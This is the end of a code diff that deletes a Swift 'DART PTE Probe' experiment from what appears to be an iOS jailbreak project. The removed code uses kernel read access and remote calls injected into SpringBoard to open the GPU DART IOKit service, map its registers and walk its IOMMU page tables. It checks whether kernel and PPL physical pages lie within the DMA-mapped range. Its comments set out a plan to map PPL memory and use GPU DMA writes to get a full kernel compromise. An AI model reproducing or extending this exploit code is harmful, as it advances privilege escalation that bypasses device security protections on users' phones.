-                        keyName = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
-                    }
-                    
-                    // Get value
-                    let valObj = remote_msg(sb, propsDict, objectForKey, keyObj, 0, 0, 0)
-                    guard valObj != 0 else {
-                        detail += "  [\(i)] \(keyName) = (null)\n"
-                        continue
-                    }
-                    
-                    // Get value class name — classCStr is in SpringBoard userspace
-                    let classObj = remote_msg(sb, valObj, classSel, 0, 0, 0, 0)
-                    var className = ""
-                    if classObj != 0 {
-                        let classCStr = remote_msg(sb, classObj, cstrSel, 0, 0, 0, 0)
-                        if classCStr != 0 {
-                            var cbuf = [UInt8](repeating: 0, count: 32)
-                            for b in 0..<32 {
-                                let ch = sb[classCStr + UInt64(b)].value8()
-                                cbuf[b] = ch
-                                if ch == 0 { break }
-                            }
-                            className = String(bytes: cbuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
-                        }
-                    }
-                    
-                    // Get value description — descCStr is in SpringBoard userspace
-                    let descObj = remote_msg(sb, valObj, descSel, 0, 0, 0, 0)
-                    var valStr = ""
-                    if descObj != 0 {
-                        let descCStr = remote_msg(sb, descObj, cstrSel, 0, 0, 0, 0)
-                        if descCStr != 0 {
-                            var vbuf = [UInt8](repeating: 0, count: 80)
-                            for b in 0..<80 {
-                                let ch = sb[descCStr + UInt64(b)].value8()
-                                vbuf[b] = ch
-                                if ch == 0 { break }
-                            }
-                            valStr = String(bytes: vbuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
-                        }
-                    }
-                    
-                    detail += "  [\(i)] \(keyName) (\(className)) = \(valStr.prefix(60))\n"
-                }
-                
-                detail += "\n"
-            }
-            
-            // ============================================================
-            // STEP 4: Find DART kernel object address via IOKit internals
-            // The IOService port maps to a kernel object. We can find it
-            // by scanning the IPC space or using the registry entry ID.
-            //
-            // Alternative: scan kernel memory for IODARTMapper vtable pattern
-            // IODARTMapper vtable is in IODARTFamily kext __DATA
-            // The object itself is in a kernel zone
-            // ============================================================
-            detail += "\n=== Step 4: Find DART MMIO via kernel object ===\n"
-            
-            // Use IOConnectMapMemory to try mapping DART registers to userspace
-            // This is the most direct approach — if DART supports memory mapping
-            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
-            
-            // Try to open DART with different types
-            let dartConnectAddr = sb.trojanMem + 0x1C00
-            sb[dartConnectAddr].setValue32(0)
-            
-            // Try type 0, 1, 2...
-            var dartConnect: UInt32 = 0
-            for connType: UInt64 in 0..<4 {
-                sb[dartConnectAddr].setValue32(0)
-                let openRet = RootExecutor.rcall(sb, "IOServiceOpen", dartSvc, taskSelf, connType, dartConnectAddr)
-                let conn = sb[dartConnectAddr].value32()
-                if openRet == 0 && conn != 0 {
-                    dartConnect = conn
-                    detail += "DART opened with type \(connType): connect=\(conn)\n"
-                    break
-                }
-            }
-            
-            if dartConnect != 0 {
-                // Try IOConnectMapMemory64 to map DART registers
-                let addrOut = sb.trojanMem + 0x1D00
-                let sizeOut = sb.trojanMem + 0x1D08
-                sb[addrOut].setValue64(0)
-                sb[sizeOut].setValue64(0)
-                
-                for memType: UInt64 in 0..<4 {
-                    sb[addrOut].setValue64(0)
-                    sb[sizeOut].setValue64(0)
-                    let mapRet = RootExecutor.rcall(sb, "IOConnectMapMemory64",
-                                                   UInt64(dartConnect), memType, taskSelf,
-                                                   addrOut, sizeOut, 1) // kIOMapAnywhere=1
-                    let mappedAddr = sb[addrOut].value64()
-                    let mappedSize = sb[sizeOut].value64()
-                    
-                    if mapRet == 0 && mappedAddr != 0 {
-                        detail += "✅ DART memory mapped! type=\(memType) addr=0x\(String(format: "%llx", mappedAddr)) size=0x\(String(format: "%llx", mappedSize))\n"
-                        
-                        // Read DART registers from mapped memory!
-                        // PARAMS1 at +0x00, TTBR at +0x200
-                        let params1 = sb[mappedAddr].value32()
-                        detail += "  PARAMS1 (+0x00): 0x\(String(format: "%08x", params1))\n"
-                        
-                        // Read TTBR[0][0] at offset 0x200
-                        let ttbr0 = sb[mappedAddr + 0x200].value32()
-                        detail += "  TTBR[0][0] (+0x200): 0x\(String(format: "%08x", ttbr0))\n"
-                        
-                        if ttbr0 & 0x80000000 != 0 {
-                            let ppn = UInt64(ttbr0 & 0x7FFFFFFF)
-                            let l1PA = ppn << 12
-                            let l1VA = l1PA &- gPhysBase &+ gVirtBase
-                            detail += "  → L1 PA=0x\(String(format: "%llx", l1PA)), VA=0x\(String(format: "%llx", l1VA))\n"
-                            
-                            // Read more TTBRs
-                            for sid in 0..<4 {
-                                for idx in 0..<4 {
-                                    let ttbrOff = 0x200 + UInt64(sid) * 16 + UInt64(idx) * 4
-                                    let ttbrVal = sb[mappedAddr + ttbrOff].value32()
-                                    if ttbrVal != 0 {
-                                        detail += "  TTBR[\(sid)][\(idx)] (+0x\(String(format: "%x", ttbrOff))): 0x\(String(format: "%08x", ttbrVal))\n"
-                                    }
-                                }
-                            }
-                            
-                            confirmedDARTL1 = l1VA
-                        }
-                        
-                        // Unmap
-                        RootExecutor.rcall(sb, "IOConnectUnmapMemory64",
-                                          UInt64(dartConnect), memType, taskSelf, mappedAddr)
-                        break
-                    } else if mapRet != 0 {
-                        detail += "  MapMemory type \(memType): ret=0x\(String(format: "%x", mapRet))\n"
-                    }
-                }
-                
-                // Also try IOConnectCallScalarMethod to read DART state
-                let scalarOut = sb.trojanMem + 0x1E00
-                let scalarOutCnt = sb.trojanMem + 0x1E80
-                
-                for selector: UInt64 in 0..<8 {
-                    sb[scalarOutCnt].setValue32(16)
-                    let callRet = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
-                                                    UInt64(dartConnect), selector,
-                                                    0, 0, scalarOut, scalarOutCnt)
-                    let outCnt = sb[scalarOutCnt].value32()
-                    if callRet == 0 && outCnt > 0 {
-                        let val0 = sb[scalarOut].value64()
-                        detail += "  Selector \(selector): SUCCESS outCnt=\(outCnt) val[0]=0x\(String(format: "%llx", val0))\n"
-                    }
-                }
-                
-                RootExecutor.rcall(sb, "IOServiceClose", UInt64(dartConnect))
-            } else {
-                detail += "Could not open DART user client (no external methods)\n"
-                detail += "DART doesn't expose user client — need kernel object scan\n\n"
-                
-                // Fallback: scan kernel objects for DART page table pointer
-                // IODARTMapper stores page tables in wired kernel memory
-                // The page table base is a kernel VA in zone range
-                // We can find it by reading IODARTMapper's ivars
-                
-                // From IOKit: each IOService has a kernel object at a zone address
-                // The registry entry ID can help us find it
-                // But we need the actual kernel pointer to the IOService object
-                
-                // Alternative approach: read DART MMIO directly via KRW
-                // DART MMIO is mapped into kernel VA space during boot
-                // On A12, DART MMIO physical addresses are in device tree
-                // Typical: 0x231000000 for AGX DART
-                // Kernel maps this to a VA we can find by scanning
-                
-                // Known A12 DART MMIO physical bases (from device tree):
-                // AGX DART: 0x231004000 (or nearby)
-                // We can compute kernel VA: these are mapped via ml_io_map
-                // which puts them in the iokit VA range (above kernel __TEXT)
-                
-                detail += "Trying direct MMIO read via known A12 DART PA...\n"
-                
-                // A12 AGX DART MMIO is typically at physical 0x231004000
-                // Kernel maps IO at: PA - 0 + io_base_va
-                // io_base_va is typically kernBase + large offset
-                // But we can try reading via physmap: PA - gPhysBase + gVirtBase
-                // Wait — MMIO is NOT in DRAM, so physmap won't work for it.
-                // MMIO is device memory, not RAM.
-                
-                // The only way to read MMIO is through the kernel's IO mapping.
-                // We need to find where the kernel mapped DART MMIO.
-                // This is stored in the IODARTMapper object's ivars.
-                
-                detail += "MMIO not accessible via physmap (device memory, not DRAM)\n"
-                detail += "Need IODARTMapper kernel object pointer to find MMIO VA\n"
-            }
-            
-            RootExecutor.rcall(sb, "IOObjectRelease", dartSvc)
-        }
-        
-        // ============================================================
-        // STEP 5: If we got DART L1, walk L2 tables
-        // ============================================================
-        if confirmedDARTL1 != 0 {
-            detail += "\n=== Step 5: Walk L2 tables from confirmed L1 ===\n"
-            detail += "L1 VA: 0x\(String(format: "%llx", confirmedDARTL1))\n\n"
-            
-            guard confirmedDARTL1 >= safeZoneMin && confirmedDARTL1 < safeZoneMax else {
-                detail += "⚠️ L1 VA outside safe zone — cannot walk\n"
-                // Still report what we found
-                let success = true
-                return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
-            }
-            
-            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
-            
-            for i in 0..<512 {
-                let readAddr = confirmedDARTL1 + UInt64(i * 8)
-                guard readAddr >= safeZoneMin && readAddr < safeZoneMax else { continue }
-                let entry = ds_kread64_safe(readAddr)
-                if entry == 0 { continue }
-                if entry & 1 == 1 {
-                    l1ValidEntries.append((idx: i, entry: entry))
-                    if l1ValidEntries.count <= 8 {
-                        let l2PA = entry & 0x0000000FFFFFF000
-                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
-                    }
-                }
-            }
-            
-            detail += "Valid L1 entries: \(l1ValidEntries.count)\n\n"
-            
-            for (idx, entry) in l1ValidEntries.prefix(4) {
-                let l2PA = entry & 0x0000000FFFFFF000
-                let l2VA = l2PA &- gPhysBase &+ gVirtBase
-                
-                guard l2VA >= safeZoneMin && l2VA < safeZoneMax else {
-                    detail += "L1[\(idx)] → L2 VA outside safe zone\n"
-                    continue
-                }
-                
-                var l2ValidCount = 0
-                for j in 0..<512 {
-                    let l2Addr = l2VA + UInt64(j * 8)
-                    guard l2Addr >= safeZoneMin && l2Addr < safeZoneMax else { continue }
-                    let l2e = ds_kread64_safe(l2Addr)
-                    if l2e & 1 == 1 {
-                        l2ValidCount += 1
-                        let leafPA = l2e & 0x0000000FFFFFF000
-                        let iova = UInt64(idx) << 21 | UInt64(j) << 12
-                        confirmedL2Entries.append((iova: iova, pa: leafPA))
-                        if l2ValidCount <= 3 {
-                            detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
-                        }
-                    }
-                }
-                detail += "  L1[\(idx)] → \(l2ValidCount) valid L2 entries\n"
-            }
-        }
-        
-        detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
-        
-        // ============================================================
-        // STEP 6: Summary and DAPF analysis
-        // ============================================================
-        detail += "\n=== Step 6: Analysis ===\n"
-        
-        if confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty {
-            detail += "✅ DART L1 page table at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
-            detail += "Total IOVA→PA mappings found: \(confirmedL2Entries.count)\n\n"
-            
-            // Analyze PA range to determine DAPF constraints
-            if !confirmedL2Entries.isEmpty {
-                let pas = confirmedL2Entries.map { $0.pa }
-                let minPA = pas.min() ?? 0
-                let maxPA = pas.max() ?? 0
-                
-                detail += "PA range of existing mappings:\n"
-                detail += "  Min PA: 0x\(String(format: "%llx", minPA))\n"
-                detail += "  Max PA: 0x\(String(format: "%llx", maxPA))\n"
-                detail += "  Range: \((maxPA - minPA) / 1024 / 1024) MB\n\n"
-                
-                // Check if kernel __DATA PA is within this range
-                // kernel __DATA physical = kernBase - gVirtBase + gPhysBase + __DATA_offset
-                let kernDataPA = (kernBase + 0x30dc000) &- gVirtBase &+ gPhysBase
-                let pplDataPA = kernDataPA + 0x8000
-                
-                detail += "Kernel __DATA PA: 0x\(String(format: "%llx", kernDataPA))\n"
-                detail += "PPL data PA: 0x\(String(format: "%llx", pplDataPA))\n"
-                
-                let kernInRange = kernDataPA >= minPA && kernDataPA <= maxPA
-                detail += "Kernel PA in DART range: \(kernInRange)\n\n"
-                
-                if kernInRange {
-                    detail += "⚡⚡⚡ KERNEL PA IS WITHIN DART-MAPPED RANGE! ⚡⚡⚡\n"
-                    detail += "DAPF may NOT block access to kernel physical pages!\n"
-                    detail += "GPU DMA to kernel memory is potentially viable!\n\n"
-                } else {
-                    detail += "⚠️ Kernel PA outside current DART range\n"
-                    detail += "DAPF might block — need to check if range is enforced\n"
-                    detail += "Or: DAPF might only check DART-level, not per-page\n\n"
-                }
-                
-                // IOVA space usage
-                let iovas = confirmedL2Entries.map { $0.iova }
-                let maxIOVA = iovas.max() ?? 0
-                detail += "IOVA space used: 0x0 - 0x\(String(format: "%x", maxIOVA))\n"
-                detail += "Free IOVA space: 0x\(String(format: "%x", maxIOVA + 0x1000)) - 0xFFFFFFFF\n"
-            }
-            
-            detail += "\n🎯 NEXT: Write test DART PTE at unused IOVA\n"
-            detail += "Map a known PA → verify GPU can access it\n"
-            detail += "Then: map PPL PA → GPU DMA write → full jailbreak\n"
-        } else {
-            detail += "❌ Could not confirm DART page table\n"
-            detail += "Possible reasons:\n"
-            detail += "  1. DART tables not in scanned zone range\n"
-            detail += "  2. Need to scan more pages or different zone\n"
-            detail += "  3. DART tables might be in wired memory outside zones\n\n"
-            detail += "NEXT: Try MMIO approach — find DART base via device tree\n"
-            detail += "Or: scan IOKit object graph for IODARTMapper instances\n"
-        }
-        
-        let success = confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
-        return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
-    }
+
     
     #endif
 }
